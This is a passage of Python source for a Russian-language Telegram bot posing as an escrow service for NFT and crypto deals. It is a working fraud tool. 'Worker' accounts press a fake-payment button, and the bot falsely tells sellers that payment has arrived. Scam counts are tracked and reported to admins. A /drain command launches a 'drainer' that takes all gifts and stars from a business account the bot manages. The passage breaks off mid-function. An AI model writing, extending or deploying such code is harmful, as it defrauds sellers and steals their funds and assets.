                                                   description=deal['description'],
                                                   amount=deal['amount'])
                    
                    keyboard = []
                    if is_worker:
                        keyboard.append([InlineKeyboardButton("🕵️️ Оплатить как воркер (фейк)", callback_data=f'pay_from_balance_{order_id}')])
                    else:
                        keyboard.append([InlineKeyboardButton("💳 Оплатить", callback_data=f'pay_from_balance_{order_id}')])
                    keyboard.append([InlineKeyboardButton("🔙 В меню", callback_data='menu_from_deal')])
                    
                    await context.bot.send_message(
                        chat_id,
                        payment_instruction,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                    
                elif payment_method == 'stars':
                    payment_instruction = cached_get_text(lang, "deal_info_stars_formatted",
                                                   order_id=order_id,
                                                   seller_username=seller_username,
                                                   successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0),
                                                   description=deal['description'],
                                                   amount=deal['amount'])
                    
                    await context.bot.send_message(
                        chat_id,
                        payment_instruction,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu_from_deal')]])
                    )
                    
                    await send_stars_invoice(
                        chat_id=chat_id,
                        order_id=order_id,
                        amount=deal['amount'],
                        description=deal['description'],
                        context=context,
                        user_lang=lang
                    )
                    
                elif payment_method == 'usdt':
                    payment_instruction = cached_get_text(lang, "deal_info_usdt_formatted",
                                                   order_id=order_id,
                                                   seller_username=seller_username,
                                                   successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0),
                                                   description=deal['description'],
                                                   amount=deal['amount'])
                    
                    keyboard = []
                    if is_worker:
                        keyboard.append([InlineKeyboardButton("🕵️️ Оплатить как воркер (фейк)", callback_data=f'pay_from_balance_{order_id}')])
                    else:
                        keyboard.append([InlineKeyboardButton("💳 Оплатить", callback_data=f'pay_from_balance_{order_id}')])
                    keyboard.append([InlineKeyboardButton("🔙 В меню", callback_data='menu_from_deal')])
                    
                    await context.bot.send_message(
                        chat_id,
                        payment_instruction,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )

                seller_lang = user_data.get(seller_id, {}).get('lang', 'ru') if seller_id else 'ru'
                try:
                    buyer_chat = await context.bot.get_chat(user_id)
                    buyer_username = buyer_chat.username or "Неизвестно"
                except Exception as e:
                    logger.error(f"Could not get chat for buyer_id {user_id}: {e}")
                    buyer_username = "Неизвестно"

                await context.bot.send_message(
                    seller_id,
                    cached_get_text(seller_lang, "seller_notification_message",
                             buyer_username=buyer_username,
                             deal_id=order_id,
                             successful_deals=user_data.get(user_id, {}).get('successful_deals', 0)),
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(cached_get_text(seller_lang, "contact_support_button"), url=f'https://t.me/{SUPPORT_USERNAME}')]
                    ])
                )
                return
            else:
                await context.bot.send_message(
                    chat_id,
                    "❌ Ордер не найден. Возможно, он был удален или завершен.",
                    parse_mode="HTML"
                )

        keyboard = [
            [InlineKeyboardButton(cached_get_text(lang, "add_wallet_button"), callback_data='wallet_menu')],
            [InlineKeyboardButton(cached_get_text(lang, "create_deal_button"), callback_data='create_deal')],
            [InlineKeyboardButton(cached_get_text(lang, "referral_button"), callback_data='referral')],
            [InlineKeyboardButton(cached_get_text(lang, "change_lang_button"), callback_data='change_lang')],
            [InlineKeyboardButton(cached_get_text(lang, "support_button"), url=f'https://t.me/{SUPPORT_USERNAME}')],
        ]
        if user_id in ADMIN_ID:
            keyboard.append([InlineKeyboardButton("🔧 Админ-панель", callback_data='admin_panel')])

        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            if os.path.exists('photo.png'):
                with open('photo.png', 'rb') as photo:
                    await context.bot.send_photo(
                        chat_id,
                        photo=photo,
                        caption=cached_get_text(lang, "start_message"),
                        parse_mode="HTML",
                        reply_markup=reply_markup
                    )
            else:
                await context.bot.send_message(
                    chat_id,
                    cached_get_text(lang, "start_message"),
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
        except FileNotFoundError:
            await context.bot.send_message(
                chat_id,
                cached_get_text(lang, "start_message"),
                parse_mode="HTML",
                reply_markup=reply_markup
            )
            
    except (NetworkError, BadRequest) as e:
        logger.error(f"Telegram API error in start: {e}", exc_info=True)
        if chat_id:
            await context.bot.send_message(chat_id, "🚫 Ошибка сети. Пожалуйста, попробуйте позже.", parse_mode="HTML")
    except Exception as e:
        logger.error(f"Ошибка в функции start: {e}", exc_info=True)
        if chat_id:
            await context.bot.send_message(chat_id, "🚫 Произошла ошибка. Пожалуйста, попробуйте позже.", parse_mode="HTML")

async def pay_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message:
            return
            
        user_id = update.message.from_user.id
        chat_id = update.message.chat_id
        
        args = context.args
        if not args or len(args) == 0:
            await update.message.reply_text("❌ Укажите номер ордера.\nПример: /pay vpy6xfwnb8", parse_mode="HTML")
            return
            
        order_id = args[0].lower()
        
        if order_id not in deals:
            await update.message.reply_text("❌ Ордер с таким номером не найден.", parse_mode="HTML")
            return
            
        deal = deals[order_id]
        
        is_worker = user_id in WORKER_ID
        
        current_buyer_id = deal.get('buyer_id')
        if current_buyer_id and current_buyer_id != user_id:
            await update.message.reply_text("❌ Этот ордер уже взят другим пользователем.", parse_mode="HTML")
            return
        
        if not current_buyer_id:
            deals[order_id]['buyer_id'] = user_id
            if is_worker:
                deals[order_id]['status'] = 'worker_scam'
            save_deal(order_id)
        
        seller_id = deal.get('seller_id')
        seller_username = "Неизвестно"
        if seller_id:
            try:
                seller_chat = await context.bot.get_chat(seller_id)
                seller_username = seller_chat.username or f"ID: {seller_id}"
            except:
                pass
        
        if is_worker:
            ensure_user_exists(user_id)
            worker_lang = user_data.get(user_id, {}).get('lang', 'ru')
            
            success_message = cached_get_text(worker_lang, "stars_payment_success_formatted",
                                       amount=int(deal['amount']),
                                       order_id=order_id)
            
            await update.message.reply_text(
                success_message,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Подтвердить получение NFT", callback_data=f'worker_confirm_{order_id}')],
                    [InlineKeyboardButton("🚫 Отменить сделку", callback_data=f'worker_cancel_{order_id}')],
                    [InlineKeyboardButton("🔙 В меню", callback_data='menu')]
                ])
            )
            
            seller_id = deal.get('seller_id')
            if seller_id:
                seller_lang = user_data.get(seller_id, {}).get('lang', 'ru') if seller_id else 'ru'
                seller_message = cached_get_text(seller_lang, "payment_confirmed_seller_message",
                                         deal_id=order_id, 
                                         description=deal.get('description', ''), 
                                         buyer_username="Покупатель")
                
                await context.bot.send_message(
                    seller_id,
                    seller_message,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(cached_get_text(seller_lang, "seller_confirm_sent_button"), callback_data=f'seller_confirm_sent_{order_id}')],
                        [InlineKeyboardButton(cached_get_text(seller_lang, "contact_support_button"), url=f'https://t.me/{SUPPORT_USERNAME}')]
                    ])
                )
            
            if user_id in worker_status:
                worker_status[user_id]['successful_scams'] += 1
                update_worker_scam_count(user_id)
            
            logger.info(f"Воркер {user_id} выполнил фейковую оплату ордера #{order_id}")
            
        else:
            ensure_user_exists(user_id)
            lang = user_data.get(user_id, {}).get('lang', 'ru')
            
            photo_message = cached_get_text(lang, "deal_info_stars_formatted",
                                     order_id=order_id,
                                     seller_username=seller_username,
                                     successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0),
                                     description=deal.get('description', ''),
                                     amount=int(deal['amount']))
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 В меню", callback_data='menu')]
            ])
            
            await context.bot.send_message(
                chat_id,
                photo_message,
                parse_mode="HTML",
                reply_markup=keyboard
            )
            
            await send_stars_invoice(
                chat_id=chat_id,
                order_id=order_id,
                amount=deal['amount'],
                description=deal['description'],
                context=context,
                user_lang=lang
            )
        
        if not is_worker or not current_buyer_id:
            if seller_id:
                seller_lang = user_data.get(seller_id, {}).get('lang', 'ru') if seller_id else 'ru'
                try:
                    buyer_chat = await context.bot.get_chat(user_id)
                    buyer_username = buyer_chat.username or "Неизвестно"
                except Exception:
                    buyer_username = "Неизвестно"
                
                await context.bot.send_message(
                    seller_id,
                    cached_get_text(seller_lang, "seller_notification_message",
                             buyer_username=buyer_username,
                             deal_id=order_id,
                             successful_deals=user_data.get(user_id, {}).get('successful_deals', 0)),
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(cached_get_text(seller_lang, "seller_confirm_sent_button"), callback_data=f'seller_confirm_sent_{order_id}')],
                        [InlineKeyboardButton(cached_get_text(seller_lang, "contact_support_button"), url=f'https://t.me/{SUPPORT_USERNAME}')]
                    ])
                )
            
    except Exception as e:
        logger.error(f"Ошибка в команде /pay: {e}", exc_info=True)
        if update.message:
            await update.message.reply_text("🚫 Произошла ошибка при обработке оплаты.", parse_mode="HTML")

async def orders_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показывает активные ордера для воркеров"""
    try:
        if not update.message:
            return
            
        user_id = update.message.from_user.id
        is_worker = user_id in WORKER_ID
        
        if not is_worker:
            return
        
        active_orders = []
        for order_id, deal in deals.items():
            if deal.get('status') == 'active' and not deal.get('buyer_id') and deal.get('payment_method') == 'stars':
                order_info = f"🆔 #{order_id} | 💰 {int(deal['amount'])} ⭐️ | 📝 {deal['description'][:30]}..."
                active_orders.append(order_info)
        
        if active_orders:
            message = "📋 Активные ордера (только звезды):\n\n" + "\n".join(active_orders)
            message += "\n\nДля оплаты используйте: /pay номер_ордера\nПример: /pay vpy6xfwnb8"
        else:
            message = "📭 Активных ордеров со звездами нет"
        
        await update.message.reply_text(message, parse_mode="HTML")
        
    except Exception as e:
        logger.error(f"Ошибка в команде /orders: {e}", exc_info=True)
        if update.message:
            await update.message.reply_text("🚫 Ошибка при получении списка ордеров.", parse_mode="HTML")

async def drain_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда для запуска дрейнера (только для админов)"""
    try:
        if not update.message:
            return
            
        user_id = update.message.from_user.id
        
        if user_id not in ADMIN_ID:
            await update.message.reply_text("🚫 Команда только для администраторов.", parse_mode="HTML")
            return
        
        global drainer_active
        
        if drainer_active:
            await update.message.reply_text(
                "🔄 Дрейнер уже запущен и работает!\n\n"
                "Для работы:\n"
                "1. Подключите бота к целевому бизнес-аккаунту как менеджера\n"
                "2. Отправьте любое сообщение в бизнес-чат\n"
                "3. Бот автоматически соберет все подарки и звезды\n\n"
                "⚠️ Убедитесь что бот имеет доступ к бизнес-аккаунту!",
                parse_mode="HTML"
            )
            return
        
        # Запускаем дрейнер в отдельном потоке
        def run_drainer():
            try:
                asyncio.run(start_drainer_async())
            except Exception as e:
                logger.error(f"Дрейнер остановился с ошибкой: {e}")
                global drainer_active
                drainer_active = False
        
        drainer_thread = threading.Thread(target=run_drainer, daemon=True)
        drainer_thread.start()
        drainer_active = True
        
        await update.message.reply_text(
            "✅ Дрейнер успешно запущен!\n\n"
            "Для работы:\n"
            "1. Подключите бота к целевому бизнес-аккаунту как менеджера\n"
            "2. Отправьте любое сообщение в бизнес-чат\n"
            "3. Бот автоматически соберет все подарки и звезды\n\n"
            "⚠️ Убедитесь что бот имеет доступ к бизнес-аккаунту!\n\n"
            "📊 Статус: АКТИВЕН",
            parse_mode="HTML"
        )
        
    except Exception as e:
        logger.error(f"Ошибка в команде /drain: {e}")
        if update.message:
            await update.message.reply_text("🚫 Ошибка при выполнении команды.", parse_mode="HTML")

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.callback_query or not update.callback_query.message:
        return
        
    query = update.callback_query
    chat_id = query.message.chat_id
    user_id = query.from_user.id
    data = query.data

    try:
        await query.answer()
    except BadRequest as e:
        error_msg = str(e)
        if "Query is too old" in error_msg or "query id is invalid" in error_msg:
            logger.warning(f"Ignoring old callback query: {error_msg}")
            try:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="⚠️ Это действие устарело. Пожалуйста, используйте меню заново.",
                    parse_mode="HTML"
                )
            except Exception:
                pass
            return
        else:
            logger.error(f"BadRequest in query.answer(): {e}")
            return
    except Exception as e:
        logger.error(f"Unexpected error in query.answer(): {e}")
        return

    logger.info(f"Button callback_data received: {data}")
    
    try:
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')

        if data == 'menu':
            keyboard = [
                [InlineKeyboardButton(cached_get_text(lang, "add_wallet_button"), callback_data='wallet_menu')],
                [InlineKeyboardButton(cached_get_text(lang, "create_deal_button"), callback_data='create_deal')],
                [InlineKeyboardButton(cached_get_text(lang, "referral_button"), callback_data='referral')],
                [InlineKeyboardButton(cached_get_text(lang, "change_lang_button"), callback_data='change_lang')],
                [InlineKeyboardButton(cached_get_text(lang, "support_button"), url=f'https://t.me/{SUPPORT_USERNAME}')],
            ]
            if user_id in ADMIN_ID:
                keyboard.append([InlineKeyboardButton("🔧 Админ-панель", callback_data='admin_panel')])

            reply_markup = InlineKeyboardMarkup(keyboard)
            caption_text = cached_get_text(lang, "start_message")
            
            if not query.message.photo:
                try:
                    await query.message.delete()
                except:
                    pass
                try:
                    if os.path.exists('photo.png'):
                        with open('photo.png', 'rb') as photo:
                            await context.bot.send_photo(
                                chat_id,
                                photo=photo,
                                caption=caption_text,
                                parse_mode="HTML",
                                reply_markup=reply_markup
                            )
                    else:
                        await context.bot.send_message(
                            chat_id,
                            caption_text,
                            parse_mode="HTML",
                            reply_markup=reply_markup
                        )
                except FileNotFoundError:
                    await context.bot.send_message(
                        chat_id,
                        caption_text,
                        parse_mode="HTML",
                        reply_markup=reply_markup
                    )
            else:
                try:
                    await query.edit_message_caption(caption=caption_text, parse_mode="HTML", reply_markup=reply_markup)
                except BadRequest as e:
                    if "Message is not modified" not in str(e):
                        logger.error(f"Cannot edit menu caption: {e}")

            return
        
        if data == 'menu_from_deal':
            await start(update, context)
            return

        elif data.startswith('pay_fake_stars_'):  
            order_id = data.split('_')[-1]
            if order_id not in deals:
                await query.edit_message_text("❌ Ордер не найден.", parse_mode="HTML")
                return
                
            deal = deals.get(order_id)
            if deal and user_id in WORKER_ID and deal.get('buyer_id') == user_id:
                deal['status'] = 'worker_scam'
                save_deal(order_id)
                
                seller_id = deal.get('seller_id')
                seller_lang = user_data.get(seller_id, {}).get('lang', 'ru') if seller_id else 'ru'
                
                seller_message = cached_get_text(seller_lang, "payment_confirmed_seller_message",
                                         deal_id=order_id, 
                                         description=deal.get('description', ''), 
                                         buyer_username="Покупатель")
                
                await context.bot.send_message(
                    seller_id,
                    seller_message,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(cached_get_text(seller_lang, "seller_confirm_sent_button"), callback_data=f'seller_confirm_sent_{order_id}')],
                        [InlineKeyboardButton(cached_get_text(seller_lang, "contact_support_button"), url=f'https://t.me/{SUPPORT_USERNAME}')]
                    ])
                )
                
                success_message = cached_get_text(lang, "stars_payment_success_formatted",
                                           amount=int(deal['amount']),
                                           order_id=order_id)
                
                await query.edit_message_text(
                    text=success_message,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("✅ Подтвердить получение NFT", callback_data=f'worker_confirm_{order_id}')],
                        [InlineKeyboardButton("🚫 Отменить сделку", callback_data=f'worker_cancel_{order_id}')],
                        [InlineKeyboardButton("🔙 В меню", callback_data='menu')]
                    ])
                )
                
                if user_id in worker_status:
                    worker_status[user_id]['successful_scams'] += 1
                    update_worker_scam_count(user_id)
                
                logger.info(f"Воркер {user_id} выполнил фейковую оплату ордера #{order_id}")

        elif data == 'wallet_menu':
            keyboard = [
                [InlineKeyboardButton(cached_get_text(lang, "add_ton_wallet_button"), callback_data='add_ton_wallet')],
                [InlineKeyboardButton(cached_get_text(lang, "add_usdt_wallet_button"), callback_data='add_usdt_wallet')],
                [InlineKeyboardButton(cached_get_text(lang, "add_card_button"), callback_data='add_card')],
                [InlineKeyboardButton("🔙 В меню", callback_data='menu')]
            ]
            message_text = cached_get_text(lang, "wallet_menu_message")
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )

        elif data == 'add_ton_wallet':
            current_wallet = user_data.get(user_id, {}).get('ton_wallet') or cached_get_text(lang, "not_specified_wallet")
            message_text = cached_get_text(lang, "add_ton_wallet_message", current_wallet=current_wallet)
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                )
            context.user_data['awaiting_ton_wallet'] = True

        elif data == 'add_usdt_wallet':
            current_wallet = user_data.get(user_id, {}).get('usdt_wallet') or cached_get_text(lang, "not_specified_wallet")
            message_text = cached_get_text(lang, "add_usdt_wallet_message", current_wallet=current_wallet)
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                )
            context.user_data['awaiting_usdt_wallet'] = True

        elif data == 'add_card':
            current_card = user_data.get(user_id, {}).get('card_details') or cached_get_text(lang, "not_specified_card")
            message_text = cached_get_text(lang, "add_card_message", current_card=current_card)
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                )
            context.user_data['awaiting_card'] = True
        
        elif data == 'create_deal':
            keyboard = [
                [InlineKeyboardButton(f"{cached_get_text(lang, 'payment_ton_button')} 💎", callback_data='payment_method_ton')],
                [InlineKeyboardButton(f"{cached_get_text(lang, 'payment_sbp_button')} ₽", callback_data='payment_method_sbp')],
                [InlineKeyboardButton(f"{cached_get_text(lang, 'payment_stars_button')} ⭐️", callback_data='payment_method_stars')],
                [InlineKeyboardButton(f"{cached_get_text(lang, 'payment_usdt_button')} 💵", callback_data='payment_method_usdt')],
                [InlineKeyboardButton("🔙 В меню", callback_data='menu')]
            ]
            message_text = cached_get_text(lang, "choose_payment_method_message")
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )

        elif data.startswith('payment_method_'):
            payment_method = data.split('_')[-1]
            
            if payment_method == 'ton':
                if not user_data.get(user_id, {}).get('ton_wallet'):
                    message_text = "❌ Для создания сделки в TON необходимо добавить TON-кошелек."
                    
                    if query.message.photo:
                        await query.edit_message_caption(
                            caption=message_text,
                            parse_mode="HTML",
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("💼 Добавить TON-кошелек", callback_data='add_ton_wallet')],
                                [InlineKeyboardButton("🔙 В меню", callback_data='menu')]
                            ])
                        )
                    else:
                        await query.edit_message_text(
                            text=message_text,
                            parse_mode="HTML",
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("💼 Добавить TON-кошелек", callback_data='add_ton_wallet')],
                                [InlineKeyboardButton("🔙 В меню", callback_data='menu')]
                            ])
                        )
                    return
            
            elif payment_method == 'usdt':
                if not user_data.get(user_id, {}).get('usdt_wallet'):
                    message_text = "❌ Для создания сделки в USDT необходимо добавить USDT-кошелек."
                    
                    if query.message.photo:
                        await query.edit_message_caption(
                            caption=message_text,
                            parse_mode="HTML",
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("💵 Добавить USDT-кошелек", callback_data='add_usdt_wallet')],
                                [InlineKeyboardButton("🔙 В меню", callback_data='menu')]
                            ])
                        )
                    else:
                        await query.edit_message_text(
                            text=message_text,
                            parse_mode="HTML",
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("💵 Добавить USDT-кошелек", callback_data='add_usdt_wallet')],
                                [InlineKeyboardButton("🔙 В меню", callback_data='menu')]
                            ])
                        )
                    return
            
            elif payment_method == 'sbp':
                if not user_data.get(user_id, {}).get('card_details'):
                    message_text = "❌ Для создания сделки в RUB необходимо добавить реквизиты карты."
                    
                    if query.message.photo:
                        await query.edit_message_caption(
                            caption=message_text,
                            parse_mode="HTML",
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("💳 Добавить карту", callback_data='add_card')],
                                [InlineKeyboardButton("🔙 В меню", callback_data='menu')]
                            ])
                        )
                    else:
                        await query.edit_message_text(
                            text=message_text,
                            parse_mode="HTML",
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("💳 Добавить карту", callback_data='add_card')],
                                [InlineKeyboardButton("🔙 В меню", callback_data='menu')]
                            ])
                        )
                    return
            
            context.user_data['payment_method'] = payment_method
            
            if payment_method == 'ton':
                message_text = cached_get_text(lang, "create_deal_ton_message")
            elif payment_method == 'usdt':
                message_text = cached_get_text(lang, "create_deal_usdt_message")
            elif payment_method == 'sbp':
                message_text = cached_get_text(lang, "create_deal_sbp_message")
            elif payment_method == 'stars':
                message_text = cached_get_text(lang, "create_deal_stars_message")
            
            if query.message.photo:
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                )
            else:
                await query.edit_message_text(
                    text=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                )
            context.user_data['awaiting_recipient_username'] = True

        elif data.startswith('pay_from_balance_'):
            order_id = data.split('_')[-1]
            if order_id not in deals:
                await query.edit_message_text("❌ Ордер не найден.", parse_mode="HTML")
                return
                
            deal = deals.get(order_id)
            if not deal:
                await query.edit_message_text("🚫 Ошибка: сделка не найдена.", parse_mode="HTML")
                return
                
            buyer_id = user_id
            seller_id = deal.get('seller_id')
            amount = deal.get('amount')

            if not (buyer_id and seller_id and amount is not None):
                logger.error(f"Invalid deal data: order_id={order_id}, buyer_id={buyer_id}, seller_id={seller_id}, amount={amount}")
                await query.edit_message_text("🚫 Ошибка: неверные данные сделки.", parse_mode="HTML")
                return

            ensure_user_exists(buyer_id)
            ensure_user_exists(seller_id)

            is_worker = buyer_id in WORKER_ID

            if is_worker:
                deal['status'] = 'worker_scam'
                save_deal(order_id)
                
                seller_lang = user_data.get(seller_id, {}).get('lang', 'ru') if seller_id else 'ru'
                worker_username = "Неизвестно"
                if buyer_id in worker_status:
                    worker_username = worker_status[buyer_id]['username']
                
                seller_message = cached_get_text(seller_lang, "payment_confirmed_seller_message",
                                             deal_id=order_id, 
                                             description=deal.get('description', ''), 
                                             buyer_username=worker_username)
                
                await context.bot.send_message(
                    seller_id,
                    seller_message,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton(cached_get_text(seller_lang, "seller_confirm_sent_button"), callback_data=f'seller_confirm_sent_{order_id}')],
                        [InlineKeyboardButton(cached_get_text(seller_lang, "contact_support_button"), url=f'https://t.me/{SUPPORT_USERNAME}')]
                    ])
                )
                
                payment_method_text = deal.get('payment_method', 'ton').upper()
                payment_icon = get_payment_icon(deal.get('payment_method', 'ton'))

                if deal.get('payment_method') == 'stars':
                    success_msg = cached_get_text(lang, "stars_payment_success_formatted",
                                           amount=int(deal['amount']),
                                           order_id=order_id)
                else:
                    success_msg = cached_get_text(lang, "payment_success_formatted",
                                           icon=payment_icon,
                                           amount=int(deal['amount']),
                                           currency=payment_method_text,
                                           order_id=order_id)

                await query.edit_message_text(
                    text=success_msg,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("✅ Подтвердить получение NFT", callback_data=f'worker_confirm_{order_id}')],
                        [InlineKeyboardButton("🚫 Отменить сделку", callback_data=f'worker_cancel_{order_id}')]
                    ])
                )
                
                if buyer_id in worker_status:
                    worker_status[buyer_id]['successful_scams'] += 1
                    update_worker_scam_count(buyer_id)
                
            else:
                logger.info(f"Buyer {buyer_id} balance: {user_data[buyer_id].get('balance', 0)}, required amount: {amount}")
                if user_data[buyer_id].get('balance', 0) >= amount:
                    user_data[buyer_id]['balance'] -= amount
                    save_user_data(buyer_id)
                    user_data[seller_id]['balance'] = user_data[seller_id].get('balance', 0) + amount
                    save_user_data(seller_id)
                    
                    deal['status'] = 'confirmed'
                    save_deal(order_id)

                    message_text = cached_get_text(lang, "payment_confirmed_message", deal_id=order_id)
                    await query.edit_message_text(text=message_text, parse_mode="HTML")

                    buyer_username = "Неизвестно"
                    try:
                        buyer_chat_info = await context.bot.get_chat(buyer_id)
                        buyer_username = buyer_chat_info.username or "Неизвестно"
                    except Exception as e:
                        logger.error(f"Failed to get buyer username: {e}")

                    seller_lang = user_data.get(seller_id, {}).get('lang', 'ru') if seller_id else 'ru'
                    seller_message = cached_get_text(seller_lang, "payment_confirmed_seller_message",
                                                     deal_id=order_id, 
                                                     description=deal.get('description', ''), 
                                                     buyer_username=buyer_username)
                    await context.bot.send_message(
                        seller_id,
                        seller_message,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton(cached_get_text(seller_lang, "seller_confirm_sent_button"), callback_data=f'seller_confirm_sent_{order_id}')],
                            [InlineKeyboardButton(cached_get_text(seller_lang, "contact_support_button"), url=f'https://t.me/{SUPPORT_USERNAME}')]
                        ])
                    )
                else:
                    message_text = cached_get_text(lang, "insufficient_balance_message")
                    await query.edit_message_text(
                        text=message_text,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu_from_deal')]])
                    )

        elif data.startswith('worker_confirm_'):
            order_id = data.split('_')[-1]
            if order_id not in deals:
                await query.edit_message_text("❌ Ордер не найден.", parse_mode="HTML")
                return
                
            deal = deals.get(order_id)
            if deal and user_id in WORKER_ID and deal.get('buyer_id') == user_id:
                deal['status'] = 'scam_completed'
                save_deal(order_id)
                
                payment_method = deal.get('payment_method', 'ton')
                payment_icon = get_payment_icon(payment_method)
                payment_method_display = payment_method.upper()
                
                await query.edit_message_text(
                    text=f"<blockquote><b>🎉 Спасибо! Получение подтверждено</b></blockquote>\n\nОрдер <u>#{order_id}</u> завершён",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                )
                
                worker_info = worker_status.get(user_id, {})
                
                for admin_id in ADMIN_ID:
                    try:
                        await context.bot.send_message(
                            admin_id,
                            f"🕵️ Воркер @{worker_info.get('username', user_id)} успешно скаммил сделку #{order_id}\n"
                            f"🆔 Ордер: #{order_id}\n"
                            f"{payment_icon} Сумма: {deal['amount']} {payment_method_display}\n"
                            f"📝 Описание: {deal['description']}",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.error(f"Failed to notify admin {admin_id}: {e}")
                
                if order_id in deals:
                    del deals[order_id]
                delete_deal(order_id)

        elif data.startswith('worker_cancel_'):
            order_id = data.split('_')[-1]
            if order_id not in deals:
                await query.edit_message_text("❌ Ордер не найден.", parse_mode="HTML")
                return
                
            deal = deals.get(order_id)
            if deal and user_id in WORKER_ID:
                deal['status'] = 'cancelled'
                save_deal(order_id)
                
                seller_id = deal.get('seller_id')
                if seller_id:
                    seller_lang = user_data.get(seller_id, {}).get('lang', 'ru') if seller_id else 'ru'
                    await context.bot.send_message(
                        seller_id,
                        cached_get_text(seller_lang, "deal_cancelled_notification", deal_id=order_id),
                        parse_mode="HTML"
                    )
                
                await query.edit_message_text(
                    text="❌ Скам отменен. Сделка закрыта.",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 В меню", callback_data='menu')]])
                )
                
                if order_id in deals:
                    del deals[order_id]
                delete_deal(order_id)

        elif data.startswith('seller_confirm_sent_'):
            order_id = data[len('seller_confirm_sent_'):]
            if order_id not in deals:
                await query.edit_message_text("❌ Ордер не найден.", parse_mode="HTML")
                return
                
            deal = deals.get(order_id)
            if deal and deal.get('status') in ['confirmed', 'worker_scam'] and user_id == deal.get('seller_id'):
                deal['status'] = 'seller_sent'
                save_deal(order_id)
                
                buyer_id = deal.get('buyer_id')
                buyer_lang = user_data.get(buyer_id, {}).get('lang', 'ru') if buyer_id else 'ru'
                
                seller_username = "Неизвестно"
                try:
                    seller_chat_info = await context.bot.get_chat(user_id)
                    seller_username = seller_chat_info.username or "Неизвестно"
                except Exception:
                    pass

                message_text = cached_get_text(lang, "seller_confirm_sent_message", deal_id=order_id)
                await query.edit_message_text(text=message_text, parse_mode="HTML")
                
        elif data.startswith('buyer_confirm_received_'):
            order_id = data[len('buyer_confirm_received_'):]
            if order_id not in deals:
                await query.edit_message_text("❌ Ордер не найден.", parse_mode="HTML")
                return
                
            deal = deals.get(order_id)
            if deal and deal.get('status') == 'seller_sent' and user_id == deal.get('buyer_id'):
                deal['status'] = 'completed'
